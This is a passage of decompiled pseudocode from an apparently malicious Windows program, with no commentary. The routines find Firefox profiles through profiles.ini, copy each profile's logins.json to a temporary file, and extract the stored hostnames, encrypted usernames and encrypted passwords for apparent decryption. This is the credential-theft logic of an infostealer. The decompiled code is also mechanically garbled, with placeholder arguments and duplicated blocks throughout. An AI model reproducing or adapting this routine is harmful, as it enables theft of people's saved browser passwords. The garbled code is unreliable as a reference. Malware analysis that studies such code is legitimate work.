                            v87 = function_40434f((char *)&g322);
                            *v86 = (int32_t)&v57;
                            function_403f58((int32_t)&g322);
                            v88 = (int32_t *)(v51 - 28);
                            *v88 = v61;
                            *(int32_t *)(v51 - 32) = v87;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v88 = (int32_t)&v58;
                            function_40da6a((int32_t)&g322, (int32_t)&g322);
                            *(int32_t *)(v51 - 36) = (int32_t)&v59;
                            function_40da6a((int32_t)&g322, (int32_t)&g322);
                            *(int32_t *)(v51 - 44) = (int32_t)&v62;
                            *(int32_t *)(v51 - 48) = function_4040d5(&g322);
                            function_4043c7((int32_t)&g322);
                            function_406f1d();
                            *(int32_t *)(v51 - 52) = v58;
                            v62 = NULL;
                            function_40434f(NULL);
                            *(int32_t *)(v51 - 56) = (int32_t)&v63;
                            *(int32_t *)(v51 - 60) = function_4040d5(&g322);
                            function_4043c7((int32_t)&g322);
                            function_406f1d();
                            v63 = 0;
                            function_406f1d();
                            *(int32_t *)(v51 - 64) = v59;
                            function_40434f((char *)&g322);
                            *(int32_t *)(v51 - 68) = (int32_t)&v64;
                            *(int32_t *)(v51 - 72) = function_4040d5(&g322);
                            function_4043c7((int32_t)&g322);
                            function_406f1d();
                            v64 = 0;
                            function_406f1d();
                            v89 = v51 - 92;
                            *(int32_t *)v89 = v20;
                            function_402790(4);
                            function_40283b();
                            v90 = v61 - 1;
                            function_406f1d();
                            function_406f1d();
                            function_406f1d();
                            function_4015d4();
                            v61 = v90;
                            v51 = v89;
                            v52 = v89;
                        }
                    }
                    // 0x40d27f
                    v53 = v52;
                    v79 = v53 - 4;
                    *(int32_t *)v79 = v15;
                    v80 = PathFileExistsW((int16_t *)&g322);
                    v45 = v79;
                    if (v80) {
                        // 0x40d28e
                        lpString2 = v53 - 8;
                        v92 = (int32_t *)lpString2;
                        *v92 = 0;
                        v93 = v15;
                        v95 = lpString2;
                        if (v93 != 0) {
                            // 0x40d29b
                            *(int32_t *)(v53 - 12) = v93;
                            lstrlenW((int16_t *)lpString2);
                            v94 = function_406f2c();
                            *(int32_t *)(v53 - 16) = v15;
                            v95 = v53 - 20;
                            *(int32_t *)v95 = v94;
                            *v92 = v94;
                            lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
                        }
                        // 0x40d2bf
                        function_413c34((int32_t)&g322);
                        v45 = v95 + 4;
                    }
                    // 0x40d2c5
                    v46 = v45;
                    v91 = (int32_t *)(v46 - 4);
                    if (v17 != 0) {
                        // 0x40d2e5
                        function_406f66();
                    }
                    // 0x40d2ea
                    v17 = 0;
                }
                // 0x40d2f3
                function_413c16();
                function_406f1d();
                v15 = 0;
                function_406f1d();
                v38 = v91;
                v39 = v46;
            }
        }
        // 0x40d30b
        function_406f1d();
        function_406f1d();
        *v38 = lpString1;
        *(int32_t *)(v39 - 8) = 260;
        *(int32_t *)(v39 - 12) = v13;
        *(int32_t *)(v39 - 16) = 0;
        *(int32_t *)(v39 - 20) = (int32_t)L"Path";
        int32_t v96 = v39 - 24; // 0x40d331
        while (GetPrivateProfileStringW((int16_t *)&g322, (int16_t *)&g322, (int16_t *)&g322, (int16_t *)&g322, (int32_t)&g322, (int16_t *)&g322) != 0) {
            // 0x40ce49
            v22 = v96;
            v21++;
            *(int32_t *)(v22 - 4) = (int32_t)L"Profile";
            *(int32_t *)(v22 - 8) = function_40460a((int16_t *)v21);
            function_4043c7((int32_t)&g322);
            function_406f1d();
            v23 = v22 - 12;
            *(int32_t *)v23 = v21;
            function_404477(0);
            lpString1_ = NULL;
            v24 = v23;
            if (a1 != 0) {
                // 0x40ce83
                *(int32_t *)(v22 - 16) = a1;
                lstrlenW(NULL);
                v25 = function_406f2c();
                *(int32_t *)(v22 - 20) = a1;
                lpString1_ = (int16_t *)v25;
                v24 = v22 - 24;
                *(int32_t *)v24 = v25;
                lstrcpyW(lpString1_, (int16_t *)&g322);
            }
            // 0x40cea5
            v26 = v24;
            v27 = lpString1_;
            v28 = v26 - 4;
            *(int32_t *)v28 = v13;
            function_4043fa((int16_t *)&g322);
            v29 = (int32_t)v27;
            v30 = v28;
            if (v27 != NULL) {
                // 0x40cec0
                *(int32_t *)(v26 - 8) = v29;
                v31 = lstrlenW(NULL);
                *(int32_t *)(v26 - 12) = 0;
                *(int32_t *)(v26 - 16) = 0;
                *(int32_t *)(v26 - 20) = 0;
                *(int32_t *)(v26 - 24) = 0;
                *(int32_t *)(v26 - 28) = v31;
                *(int32_t *)(v26 - 32) = v29;
                *(int32_t *)(v26 - 36) = 512;
                *(int32_t *)(v26 - 40) = 0;
                v32 = WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322);
                v33 = function_406f2c();
                *(int32_t *)(v26 - 44) = v29;
                v34 = lstrlenW((int16_t *)&g322);
                *(int32_t *)(v26 - 48) = 0;
                *(int32_t *)(v26 - 52) = 0;
                *(int32_t *)(v26 - 56) = v32;
                *(int32_t *)(v26 - 60) = v33;
                *(int32_t *)(v26 - 64) = v34;
                *(int32_t *)(v26 - 68) = v29;
                *(int32_t *)(v26 - 72) = 0;
                *(int32_t *)(v26 - 76) = 0xfde9;
                WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322);
                *(int32_t *)(v26 - 80) = v33;
                v35 = function_40434f((char *)&g322);
                v30 = v26 - 84;
                *(int32_t *)v30 = v35;
                function_40415d((int32_t)&g322);
                function_406f1d();
                function_406f1d();
            }
            // 0x40cf2b
            v36 = v30;
            v37 = (int32_t *)(v36 - 4);
            *v37 = 0;
            v38 = v37;
            v39 = v36;
            if (!((lpString == 0 | *(int32_t *)(lpString + 132) != 0))) {
                // 0x40cf59
                *v37 = 0;
                v65 = (int32_t *)(v36 - 8);
                *v65 = 1;
                v66 = v36 - 12;
                v67 = (int32_t *)v66;
                v38 = v37;
                v39 = v36;
                if (*(int32_t *)(lpString + 152) == 0) {
                    // 0x40cf73
                    v43 = v67;
                    v42 = v65;
                    v41 = v37;
                    lpString1__ = NULL;
                    v47 = v36;
                    if (v27 != NULL) {
                        // 0x40cf7a
                        *v37 = v29;
                        lstrlenW((int16_t *)lpString);
                        v71 = function_406f2c();
                        *v65 = v29;
                        *v67 = v71;
                        lpString1__ = (int16_t *)v71;
                        lstrcpyW(lpString1__, (int16_t *)&g322);
                        v43 = (int32_t *)(v36 - 24);
                        v42 = (int32_t *)(v36 - 20);
                        v41 = (int32_t *)(v36 - 16);
                        v47 = v66;
                    }
                    // 0x40cf98
                    v48 = v47;
                    *v41 = (int32_t)L"\\logins.json";
                    function_4043fa((int16_t *)&g322);
                    *v42 = 26;
                    function_413915();
                    *v42 = (int32_t)&g17;
                    function_4043fa((int16_t *)&g322);
                    *v43 = 8;
                    *v43 = function_4044c4();
                    function_4042c5((int32_t)&g322);
                    function_406f1d();
                    *(int32_t *)(v48 - 16) = (int32_t)L".tmp";
                    function_4043fa(NULL);
                    *(int32_t *)(v48 - 20) = 0;
                    *(int32_t *)(v48 - 24) = v15;
                    v68 = (int32_t)lpString1__;
                    v69 = v48 - 28;
                    *(int32_t *)v69 = v68;
                    v70 = CopyFileW((int16_t *)&g322, (int16_t *)&g322, (bool)&g322);
                    v72 = v69;
                    if (v70) {
                        // 0x40cffa
                        v72 = v48 - 32;
                        *(int32_t *)v72 = v16;
                        function_4043c7((int32_t)&g322);
                    }
                    // 0x40d006
                    v49 = v72;
                    function_413fc0();
                    v44 = &v60;
                    v76 = v49;
                    if (lpString1__ != NULL) {
                        // 0x40d01e
                        *(int32_t *)(v49 - 4) = v68;
                        v75 = lstrlenW(NULL);
                        lpString1___ = function_406e8d();
                        *(int32_t *)(v49 - 8) = v68;
                        v76 = v49 - 12;
                        *(int32_t *)v76 = lpString1___;
                        lstrcpyW((int16_t *)lpString1___, (int16_t *)&g322);
                        v44 = 2 * v75 + 2;
                    }
                    // 0x40d041
                    v50 = v76;
                    *(int32_t *)(v50 - 4) = v44;
                    v73 = v50 - 8;
                    *(int32_t *)v73 = -0x40000000;
                    v74 = function_413f4f((int32_t)&g322);
                    v40 = (int32_t *)(v50 - 12);
                    v91 = v40;
                    v46 = v73;
                    if (v74 != 0) {
                        // 0x40d060
                        *v40 = 0;
                        v17 = 0;
                        *(int32_t *)(v50 - 20) = v18;
                        function_413b7c(v17, 0, (int32_t)&g322);
                        *(int32_t *)(v50 - 24) = (int32_t)"encryptedUsername";
                        function_40434f((char *)&g322);
                        v77 = v50 - 28;
                        *(int32_t *)v77 = (int32_t)&v54;
                        function_403f58((int32_t)&g322);
                        v78 = function_40c354();
                        function_406f1d();
                        function_406f1d();
                        v61 = v78;
                        v51 = v77;
                        v52 = v77;
                        if (v78 != 0) {
                            *(int32_t *)(v51 - 4) = (int32_t)"hostname";
                            v19 = NULL;
                            v81 = function_40434f(NULL);
                            *(int32_t *)(v51 - 8) = (int32_t)&v55;
                            function_403f58((int32_t)&g322);
                            v82 = (int32_t *)(v51 - 12);
                            *v82 = v61;
                            v83 = (int32_t *)(v51 - 16);
                            *v83 = v81;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v82 = (int32_t)"encryptedUsername";
                            v84 = function_40434f((char *)&g322);
                            *v83 = (int32_t)&v56;
                            function_403f58((int32_t)&g322);
                            v85 = (int32_t *)(v51 - 20);
                            *v85 = v61;
                            v86 = (int32_t *)(v51 - 24);
                            *v86 = v84;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v85 = (int32_t)"encryptedPassword";
                            v87 = function_40434f((char *)&g322);
                            *v86 = (int32_t)&v57;
                            function_403f58((int32_t)&g322);
                            v88 = (int32_t *)(v51 - 28);
                            *v88 = v61;
                            *(int32_t *)(v51 - 32) = v87;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v88 = (int32_t)&v58;
                            function_40da6a((int32_t)&g322, (int32_t)&g322);
                            *(int32_t *)(v51 - 36) = (int32_t)&v59;
                            function_40da6a((int32_t)&g322, (int32_t)&g322);
                            *(int32_t *)(v51 - 44) = (int32_t)&v62;
                            *(int32_t *)(v51 - 48) = function_4040d5(&g322);
                            function_4043c7((int32_t)&g322);
                            function_406f1d();
                            *(int32_t *)(v51 - 52) = v58;
                            v62 = NULL;
                            function_40434f(NULL);
                            *(int32_t *)(v51 - 56) = (int32_t)&v63;
                            *(int32_t *)(v51 - 60) = function_4040d5(&g322);
                            function_4043c7((int32_t)&g322);
                            function_406f1d();
                            v63 = 0;
                            function_406f1d();
                            *(int32_t *)(v51 - 64) = v59;
                            function_40434f((char *)&g322);
                            *(int32_t *)(v51 - 68) = (int32_t)&v64;
                            *(int32_t *)(v51 - 72) = function_4040d5(&g322);
                            function_4043c7((int32_t)&g322);
                            function_406f1d();
                            v64 = 0;
                            function_406f1d();
                            v89 = v51 - 92;
                            *(int32_t *)v89 = v20;
                            function_402790(4);
                            function_40283b();
                            v90 = v61 - 1;
                            function_406f1d();
                            function_406f1d();
                            function_406f1d();
                            function_4015d4();
                            v61 = v90;
                            v51 = v89;
                            v52 = v89;
                            while (v90 != 0) {
                                // 0x40d0bc
                                *(int32_t *)(v51 - 4) = (int32_t)"hostname";
                                v19 = NULL;
                                v81 = function_40434f(NULL);
                                *(int32_t *)(v51 - 8) = (int32_t)&v55;
                                function_403f58((int32_t)&g322);
                                v82 = (int32_t *)(v51 - 12);
                                *v82 = v61;
                                v83 = (int32_t *)(v51 - 16);
                                *v83 = v81;
                                function_40c38d((int32_t)&g322, (int32_t)&g322);
                                function_406f1d();
                                function_406f1d();
                                *v82 = (int32_t)"encryptedUsername";
                                v84 = function_40434f((char *)&g322);
                                *v83 = (int32_t)&v56;
                                function_403f58((int32_t)&g322);
                                v85 = (int32_t *)(v51 - 20);
                                *v85 = v61;
                                v86 = (int32_t *)(v51 - 24);
                                *v86 = v84;
                                function_40c38d((int32_t)&g322, (int32_t)&g322);
                                function_406f1d();
                                function_406f1d();
                                *v85 = (int32_t)"encryptedPassword";
                                v87 = function_40434f((char *)&g322);
                                *v86 = (int32_t)&v57;
                                function_403f58((int32_t)&g322);
                                v88 = (int32_t *)(v51 - 28);
                                *v88 = v61;
                                *(int32_t *)(v51 - 32) = v87;
                                function_40c38d((int32_t)&g322, (int32_t)&g322);
                                function_406f1d();
                                function_406f1d();
                                *v88 = (int32_t)&v58;
                                function_40da6a((int32_t)&g322, (int32_t)&g322);
                                *(int32_t *)(v51 - 36) = (int32_t)&v59;
                                function_40da6a((int32_t)&g322, (int32_t)&g322);
                                *(int32_t *)(v51 - 44) = (int32_t)&v62;
                                *(int32_t *)(v51 - 48) = function_4040d5(&g322);
                                function_4043c7((int32_t)&g322);
                                function_406f1d();
                                *(int32_t *)(v51 - 52) = v58;
                                v62 = NULL;
                                function_40434f(NULL);
                                *(int32_t *)(v51 - 56) = (int32_t)&v63;
                                *(int32_t *)(v51 - 60) = function_4040d5(&g322);
                                function_4043c7((int32_t)&g322);
                                function_406f1d();
                                v63 = 0;
                                function_406f1d();
                                *(int32_t *)(v51 - 64) = v59;
                                function_40434f((char *)&g322);
                                *(int32_t *)(v51 - 68) = (int32_t)&v64;
                                *(int32_t *)(v51 - 72) = function_4040d5(&g322);
                                function_4043c7((int32_t)&g322);
                                function_406f1d();
                                v64 = 0;
                                function_406f1d();
                                v89 = v51 - 92;
                                *(int32_t *)v89 = v20;
                                function_402790(4);
                                function_40283b();
                                v90 = v61 - 1;
                                function_406f1d();
                                function_406f1d();
                                function_406f1d();
                                function_4015d4();
                                v61 = v90;
                                v51 = v89;
                                v52 = v89;
                            }
                        }
                        // 0x40d27f
                        v53 = v52;
                        v79 = v53 - 4;
                        *(int32_t *)v79 = v15;
                        v80 = PathFileExistsW((int16_t *)&g322);
                        v45 = v79;
                        if (v80) {
                            // 0x40d28e
                            lpString2 = v53 - 8;
                            v92 = (int32_t *)lpString2;
                            *v92 = 0;
                            v93 = v15;
                            v95 = lpString2;
                            if (v93 != 0) {
                                // 0x40d29b
                                *(int32_t *)(v53 - 12) = v93;
                                lstrlenW((int16_t *)lpString2);
                                v94 = function_406f2c();
                                *(int32_t *)(v53 - 16) = v15;
                                v95 = v53 - 20;
                                *(int32_t *)v95 = v94;
                                *v92 = v94;
                                lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
                            }
                            // 0x40d2bf
                            function_413c34((int32_t)&g322);
                            v45 = v95 + 4;
                        }
                        // 0x40d2c5
                        v46 = v45;
                        v91 = (int32_t *)(v46 - 4);
                        if (v17 != 0) {
                            // 0x40d2e5
                            function_406f66();
                        }
                        // 0x40d2ea
                        v17 = 0;
                    }
                    // 0x40d2f3
                    function_413c16();
                    function_406f1d();
                    v15 = 0;
                    function_406f1d();
                    v38 = v91;
                    v39 = v46;
                }
            }
            // 0x40d30b
            function_406f1d();
            function_406f1d();
            *v38 = lpString1;
            *(int32_t *)(v39 - 8) = 260;
            *(int32_t *)(v39 - 12) = v13;
            *(int32_t *)(v39 - 16) = 0;
            *(int32_t *)(v39 - 20) = (int32_t)L"Path";
            v96 = v39 - 24;
        }
    }
    // 0x40d346
    function_40df46();
    function_406f1d();
    // 0x40d359
    function_406f1d();
    function_406f1d();
    function_406f1d();
    return 1;
}

// Address range: 0x40d379 - 0x40da6a
int32_t function_40d379(int32_t a1) {
    // 0x40d379
    int32_t v1; // 0x40d379
    int32_t lpString3 = v1;
    function_40460a(L"Profile");
    int32_t v2; // bp-1232, 0x40d379
    function_401293(&v2, 0, 520);
    int32_t lpBinaryType = 0; // bp-68, 0x40d3ae
    int32_t lpString1; // bp-712, 0x40d379
    function_401293(&lpString1, 0, 260);
    if (function_40eb8e() == 0) {
        // 0x40da51
        function_406f1d();
        function_406f1d();
        return 0;
    }
    // 0x40d3e0
    function_40460a((int16_t *)&lpString1);
    lstrcatW((int16_t *)&lpString1, L"\\firefox.exe");
    GetBinaryTypeW((int16_t *)&lpString1, &lpBinaryType);
    int32_t lpString2; // bp-36, 0x40d379
    int32_t v3 = &lpString2;
    int32_t v4 = v3;
    int32_t result; // 0x40d379
    int32_t v5; // 0x40d379
    int16_t * v6; // bp-1284, 0x40d379
    if (lpBinaryType != 6) {
        // 0x40d436
        v4 = 0;
        int32_t v7 = &v4; // 0x40d43f
        if (lpString2 != 0) {
            int16_t * lpString = (int16_t *)lpString2; // 0x40d441
            v6 = lpString;
            lstrlenW(lpString);
            int32_t v8 = function_406f2c(); // 0x40d451
            v4 = v8;
            int16_t * lpString1_ = (int16_t *)v8; // 0x40d45b
            int16_t * v9 = lpString1_; // bp-1292, 0x40d45b
            lstrcpyW(lpString1_, (int16_t *)lpString2);
            v7 = (int32_t)&v9;
        }
        int32_t v10 = function_40e331((int32_t)&g322, (int32_t)&g322); // 0x40d464
        v5 = v7;
        result = 0;
        if (v10 == 0) {
            goto lab_0x40da49;
        } else {
            goto lab_0x40d473;
        }
    } else {
        // 0x40d418
        v6 = (int16_t *)&lpString2;
        function_404656(v3);
        int32_t v11 = function_40e331((int32_t)&g322, (int32_t)&g322); // 0x40d428
        v5 = (int32_t)&v6;
        result = 0;
        if (v11 != 0) {
            goto lab_0x40d473;
        } else {
            goto lab_0x40da49;
        }
    }
  lab_0x40da49:
    // 0x40da49
    function_406f1d();
    // 0x40da51
    function_406f1d();
    function_406f1d();
    return result;
  lab_0x40d473:;
    int32_t v12 = v5 - 4; // 0x40d473
    *(int32_t *)v12 = (int32_t)&g20;
    function_4043fa((int16_t *)&g322);
    int32_t v13 = 0; // 0x40d486
    int32_t v14 = v12; // 0x40d486
    if (a1 != 0) {
        // 0x40d488
        *(int32_t *)(v5 - 8) = a1;
        lstrlenW(NULL);
        int32_t lpString1__ = function_406f2c(); // 0x40d498
        *(int32_t *)(v5 - 12) = a1;
        int32_t v15 = v5 - 16; // 0x40d4a3
        *(int32_t *)v15 = lpString1__;
        lstrcpyW((int16_t *)lpString1__, (int16_t *)&g322);
        v13 = lpString1__;
        v14 = v15;
    }
    // 0x40d4aa
    *(int32_t *)(v14 - 4) = (int32_t)L"profiles.ini";
    function_4043fa((int16_t *)&g322);
    *(int32_t *)(v14 - 8) = (int32_t)L"Profile";
    *(int32_t *)(v14 - 12) = function_40460a((int16_t *)&g322);
    function_4043c7((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v14 - 16) = 0;
    function_404477((int32_t)&g322);
    *(int32_t *)(v14 - 20) = v13;
    *(int32_t *)(v14 - 24) = 260;
    int32_t v16 = &v2; // 0x40d4ec
    *(int32_t *)(v14 - 28) = v16;
    *(int32_t *)(v14 - 32) = 0;
    *(int32_t *)(v14 - 36) = (int32_t)L"Path";
    int32_t v17 = GetPrivateProfileStringW((int16_t *)&g322, (int16_t *)&g322, (int16_t *)&g322, (int16_t *)&g322, (int32_t)&g322, (int16_t *)&g322); // 0x40d4f6
    if (v17 != 0) {
        // 0x40d504
        int32_t v18; // bp-12, 0x40d379
        int32_t v19 = &v18;
        int32_t v20; // bp-56, 0x40d379
        int32_t v21 = &v20;
        char * v22; // bp-112, 0x40d379
        int32_t v23 = (int32_t)&v22;
        int32_t v24 = 0; // 0x40d504
        int32_t v25 = v14 - 40;
        v24++;
        *(int32_t *)(v25 - 4) = (int32_t)L"Profile";
        *(int32_t *)(v25 - 8) = function_40460a((int16_t *)v24);
        function_4043c7((int32_t)&g322);
        function_406f1d();
        int32_t v26 = v25 - 12; // 0x40d529
        *(int32_t *)v26 = v24;
        function_404477(0);
        int16_t * lpString1___ = NULL; // 0x40d53c
        int32_t v27 = v26; // 0x40d53c
        int32_t v28; // 0x40d54e
        if (a1 != 0) {
            // 0x40d53e
            *(int32_t *)(v25 - 16) = a1;
            lstrlenW(NULL);
            v28 = function_406f2c();
            *(int32_t *)(v25 - 20) = a1;
            lpString1___ = (int16_t *)v28;
            v27 = v25 - 24;
            *(int32_t *)v27 = v28;
            lstrcpyW(lpString1___, (int16_t *)&g322);
        }
        int32_t v29 = v27;
        int16_t * v30 = lpString1___;
        int32_t v31 = v29 - 4; // 0x40d566
        *(int32_t *)v31 = v16;
        function_4043fa((int16_t *)&g322);
        int32_t v32 = (int32_t)v30; // 0x40d56f
        int32_t v33 = v31; // 0x40d579
        int32_t v34; // 0x40d57c
        int32_t v35; // 0x40d58e
        int32_t v36; // 0x40d598
        int32_t v37; // 0x40d5a0
        int32_t v38; // 0x40d5be
        if (v30 != NULL) {
            // 0x40d57b
            *(int32_t *)(v29 - 8) = v32;
            v34 = lstrlenW(NULL);
            *(int32_t *)(v29 - 12) = 0;
            *(int32_t *)(v29 - 16) = 0;
            *(int32_t *)(v29 - 20) = 0;
            *(int32_t *)(v29 - 24) = 0;
            *(int32_t *)(v29 - 28) = v34;
            *(int32_t *)(v29 - 32) = v32;
            *(int32_t *)(v29 - 36) = 512;
            *(int32_t *)(v29 - 40) = 0;
            v35 = WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322);
            v36 = function_406f2c();
            *(int32_t *)(v29 - 44) = v32;
            v37 = lstrlenW((int16_t *)&g322);
            *(int32_t *)(v29 - 48) = 0;
            *(int32_t *)(v29 - 52) = 0;
            *(int32_t *)(v29 - 56) = v35;
            *(int32_t *)(v29 - 60) = v36;
            *(int32_t *)(v29 - 64) = v37;
            *(int32_t *)(v29 - 68) = v32;
            *(int32_t *)(v29 - 72) = 0;
            *(int32_t *)(v29 - 76) = 0xfde9;
            WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322);
            *(int32_t *)(v29 - 80) = v36;
            v38 = function_40434f((char *)&g322);
            v33 = v29 - 84;
            *(int32_t *)v33 = v38;
            function_40415d((int32_t)&g322);
            function_406f1d();
            function_406f1d();
        }
        int32_t v39 = v33;
        int32_t * v40 = (int32_t *)(v39 - 4);
        *v40 = 0;
        int32_t * v41 = v40; // 0x40d5ef
        int32_t v42 = v39; // 0x40d5ef
        int32_t * v43; // 0x40d379
        int32_t * v44; // 0x40d379
        int32_t * v45; // 0x40d379
        int32_t * v46; // 0x40d379
        int32_t v47; // 0x40d379
        int32_t v48; // 0x40d379
        int32_t v49; // 0x40d379
        int32_t v50; // 0x40d379
        int32_t v51; // 0x40d379
        int32_t v52; // 0x40d379
        int32_t v53; // 0x40d379
        int32_t v54; // 0x40d379
        int32_t v55; // 0x40d379
        int32_t v56; // 0x40d379
        int32_t v57; // 0x40d379
        int32_t v58; // 0x40d379
        int32_t v59; // 0x40d379
        int32_t v60; // 0x40d379
        int32_t v61; // 0x40d379
        int32_t v62; // 0x40d379
        int32_t v63; // bp-120, 0x40d379
        int32_t v64; // bp-128, 0x40d379
        int32_t v65; // bp-136, 0x40d379
        int32_t v66; // bp-144, 0x40d379
        int32_t v67; // bp-192, 0x40d379
        int32_t v68; // 0x40d379
        char * v69; // bp-60, 0x40d379
        char * v70; // bp-64, 0x40d379
        int32_t v71; // bp-80, 0x40d379
        int32_t v72; // bp-84, 0x40d379
        int32_t v73; // bp-88, 0x40d379
        int32_t v74; // 0x40d9a5
        int32_t v75; // 0x40d379
        int32_t v76; // 0x40d8a4
        int32_t v77; // 0x40d8a9
        int32_t v78; // 0x40d91c
        int32_t v79; // 0x40d93f
        int32_t v80; // 0x40d8ed
        int32_t v81; // 0x40d8f2
        int32_t * v82; // 0x40d379
        int32_t v83; // 0x40d379
        int32_t * v84; // 0x40d379
        int32_t v85; // 0x40d6a2
        int32_t v86; // 0x40d6a2
        bool v87; // 0x40d6a5
        int32_t v88; // 0x40d63d
        int16_t * lpString1____; // 0x40d644
        int32_t v89; // 0x40d6b2
        int32_t v90; // 0x40d6f7
        int32_t v91; // 0x40d702
        int32_t v92; // 0x40d6d4
        int32_t lpString1_____; // 0x40d6e1
        int32_t v93; // 0x40d6ef
        int32_t v94; // 0x40d740
        int32_t v95; // 0x40d74a
        int32_t v96; // 0x40d96e
        bool v97; // 0x40d971
        int32_t v98; // 0x40d782
        int32_t * v99; // 0x40d795
        int32_t * v100; // 0x40d79d
        int32_t v101; // 0x40d7c0
        int32_t * v102; // 0x40d7d6
        int32_t * v103; // 0x40d7de
        int32_t v104; // 0x40d807
        int32_t * v105; // 0x40d81d
        int32_t v106; // 0x40d866
        int32_t v107; // 0x40d86b
        int32_t v108; // 0x40d379
        int32_t * v109; // 0x40d379
        int32_t lpString4; // 0x40d97d
        int32_t * v110; // 0x40d97d
        int32_t v111; // 0x40d985
        int32_t v112; // 0x40d99a
        if (!((lpString3 == 0 | *(int32_t *)(lpString3 + 132) != 0))) {
            // 0x40d60e
            *v40 = 0;
            v82 = (int32_t *)(v39 - 8);
            *v82 = 1;
            v83 = v39 - 12;
            v84 = (int32_t *)v83;
            v41 = v40;
            v42 = v39;
            if (*(int32_t *)(lpString3 + 152) == 0) {
                // 0x40d628
                v46 = v84;
                v45 = v82;
                v44 = v40;
                lpString1____ = NULL;
                v57 = v39;
                if (v30 != NULL) {
                    // 0x40d62f
                    *v40 = v32;
                    lstrlenW((int16_t *)lpString3);
                    v88 = function_406f2c();
                    *v82 = v32;
                    *v84 = v88;
                    lpString1____ = (int16_t *)v88;
                    lstrcpyW(lpString1____, (int16_t *)&g322);
                    v46 = (int32_t *)(v39 - 24);
                    v45 = (int32_t *)(v39 - 20);
                    v44 = (int32_t *)(v39 - 16);
                    v57 = v83;
                }
                // 0x40d64d
                v58 = v57;
                *v44 = (int32_t)L"\\logins.json";
                function_4043fa((int16_t *)&g322);
                *v45 = 26;
                function_413915();
                *v45 = (int32_t)&g17;
                function_4043fa((int16_t *)&g322);
                *v46 = 8;
                *v46 = function_4044c4();
                function_4042c5((int32_t)&g322);
                function_406f1d();
                *(int32_t *)(v58 - 16) = (int32_t)L".tmp";
                function_4043fa(NULL);
                *(int32_t *)(v58 - 20) = 0;
                *(int32_t *)(v58 - 24) = v18;
                v85 = (int32_t)lpString1____;
                v86 = v58 - 28;
                *(int32_t *)v86 = v85;
                v87 = CopyFileW((int16_t *)&g322, (int16_t *)&g322, (bool)&g322);
                v89 = v86;
                if (v87) {
                    // 0x40d6af
                    v89 = v58 - 32;
                    *(int32_t *)v89 = v19;
                    function_4043c7((int32_t)&g322);
                }
                // 0x40d6bb
                v59 = v89;
                function_413fc0();
                v47 = &v67;
                v93 = v59;
                if (lpString1____ != NULL) {
                    // 0x40d6d3
                    *(int32_t *)(v59 - 4) = v85;
                    v92 = lstrlenW(NULL);
                    lpString1_____ = function_406e8d();
                    *(int32_t *)(v59 - 8) = v85;
                    v93 = v59 - 12;
                    *(int32_t *)v93 = lpString1_____;
                    lstrcpyW((int16_t *)lpString1_____, (int16_t *)&g322);
                    v47 = 2 * v92 + 2;
                }
                // 0x40d6f6
                v60 = v93;
                *(int32_t *)(v60 - 4) = v47;
                v90 = v60 - 8;
                *(int32_t *)v90 = -0x40000000;
                v91 = function_413f4f((int32_t)&g322);
                v43 = (int32_t *)(v60 - 12);
                v109 = v43;
                v56 = v90;
                if (v91 != 0) {
                    // 0x40d715
                    *v43 = 0;
                    v20 = 0;
                    *(int32_t *)(v60 - 20) = v21;
                    function_413b7c(v20, 0, (int32_t)&g322);
                    *(int32_t *)(v60 - 24) = (int32_t)"encryptedUsername";
                    function_40434f((char *)&g322);
                    v94 = v60 - 28;
                    *(int32_t *)v94 = (int32_t)&v63;
                    function_403f58((int32_t)&g322);
                    v95 = function_40c354();
                    function_406f1d();
                    function_406f1d();
                    v68 = v95;
                    v61 = v94;
                    v53 = v94;
                    if (v95 != 0) {
                        v62 = v61;
                        *(int32_t *)(v62 - 4) = (int32_t)"hostname";
                        v22 = NULL;
                        v98 = function_40434f(NULL);
                        *(int32_t *)(v62 - 8) = (int32_t)&v64;
                        function_403f58((int32_t)&g322);
                        v99 = (int32_t *)(v62 - 12);
                        *v99 = v68;
                        v100 = (int32_t *)(v62 - 16);
                        *v100 = v98;
                        function_40c38d((int32_t)&g322, (int32_t)&g322);
                        function_406f1d();
                        function_406f1d();
                        *v99 = (int32_t)"encryptedUsername";
                        v101 = function_40434f((char *)&g322);
                        *v100 = (int32_t)&v65;
                        function_403f58((int32_t)&g322);
                        v102 = (int32_t *)(v62 - 20);
                        *v102 = v68;
                        v103 = (int32_t *)(v62 - 24);
                        *v103 = v101;
                        function_40c38d((int32_t)&g322, (int32_t)&g322);
                        function_406f1d();
                        function_406f1d();
                        *v102 = (int32_t)"encryptedPassword";
                        v104 = function_40434f((char *)&g322);
                        *v103 = (int32_t)&v66;
                        function_403f58((int32_t)&g322);
                        v105 = (int32_t *)(v62 - 28);
                        *v105 = v68;
                        *(int32_t *)(v62 - 32) = v104;
                        function_40c38d((int32_t)&g322, (int32_t)&g322);
                        function_406f1d();
                        function_406f1d();
                        *v105 = (int32_t)&v69;
                        function_40da6a((int32_t)&g322, (int32_t)&g322);
                        *(int32_t *)(v62 - 36) = (int32_t)&v70;
                        function_40da6a((int32_t)&g322, (int32_t)&g322);
                        *(int32_t *)(v62 - 44) = (int32_t)&v71;
                        v106 = function_4040d5(&g322);
                        v107 = v62 - 48;
                        *(int32_t *)v107 = v106;
                        function_4043c7((int32_t)&g322);
                        function_406f1d();
                        v108 = (int32_t)v69;
                        v71 = 0;
                        v49 = v108;
                        v48 = v49 + 1;
                        while (*(char *)v49 != 0) {
                            // 0x40d885
                            v49 = v48;
                            v48 = v49 + 1;
                        }
